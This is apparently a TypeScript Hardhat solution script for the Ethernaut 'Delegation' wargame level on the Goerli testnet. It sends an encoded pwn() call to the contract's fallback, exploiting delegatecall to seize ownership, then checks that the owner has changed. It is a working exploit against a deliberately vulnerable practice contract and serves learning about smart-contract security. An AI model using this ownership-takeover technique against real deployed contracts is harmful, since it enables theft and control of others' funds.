import { AbiCoder } from "@ethersproject/abi";
import { Wallet } from "ethers";
import { ethers } from "hardhat";

const attackDelegation = async () => {
    // change contract addresses here.
    const delegationAddress = process.env.DELEGATION!; //type "await contract.address()" in ethernaut console
    // const player = ""; //place your player address here (you may type player in ethernaut console)
    const args: [] = [];
    const player = process.env.PRIVATE_KEY || "";
    // [deployer] = await ethers.getSigners();

    // Don't touch below 🚀
    // Vulnerability from being able to change owner of contract by using
    // additional read:
    // https://eip2535diamonds.substack.com/p/understanding-delegatecall-and-how
    // typing all commands in console below
    // type contract.abi in ethernaut to expose all ABI (change this only if there was an update in ethernaut and this is no longer the same)
    const ABI = [
        {
            inputs: [{ internalType: "address", name: "_delegateAddress", type: "address" }],
            outputs: [],
            payable: undefined,
            stateMutability: "nonpayable",
            type: "constructor",
        },
        {
            stateMutability: "nonpayable",
            type: "fallback",
        },
        {
            inputs: [],
            name: "owner",
            outputs: [{ internalType: "address", name: "", type: "address" }],
            stateMutability: "view",
            type: "function",
        },
    ];
    const contract = await ethers.getContractAt("Delegation", delegationAddress);
    console.log("Checking current contract owner...");
    const oldOwner = await contract.owner();
    console.log(`Current contract owner: ${oldOwner}`);
    // using my custom rpc stored in .env (for privacy)
    const GOERLI_RPC_URL = process.env.GOERLI_RPC_URL;
    const provider = new ethers.providers.JsonRpcProvider(GOERLI_RPC_URL);
    const wallet = new Wallet(player, provider);
    // endoding function here
    console.log("Encoding function signature...");
    const iface = new ethers.utils.Interface(["function pwn()"]);
    const signature = iface.encodeFunctionData("pwn()");
    // sending transaction here
    console.log(signature);
    // converting to bytes4
    // adding zeros before
    // console.log("Converting encoded signature to bytes...");
    // const data = ethers.utils.hexZeroPad(ethers.utils.hexlify(signature), 32);
    // console.log(data);
    console.log("Converting encoded signature to bytes...");
    // const data = signature + "00".repeat(32);
    // console.log(data);
    // console.log("Now sending transaction to call fallback ...");
    // const data = signature.toString();

    const tx = await wallet.sendTransaction({
        from: wallet.address,
        to: delegationAddress,
        data: signature,
    });
    console.log(tx);
    const txReceipt = await tx.wait(1);
    console.log(txReceipt);
    console.log("Checking if player is now owner...");
    const newOwner = await contract.owner();
    console.log(`Contract Owner is now: ${newOwner}`);
    const owner = newOwner === wallet.address;
    console.log(`Player is now owner: ${owner}`);
    if (owner) {
        console.log("Congrats Level passed! Player is now the new owner...");
        console.log("Done...submit in ethernaut");
    } else {
        console.log("Player is not owner, please review code above");
    }
};

attackDelegation()
    .then(() => process.exit(0))
    .catch((error) => {
        console.error(error);
        process.exit(1);
    });
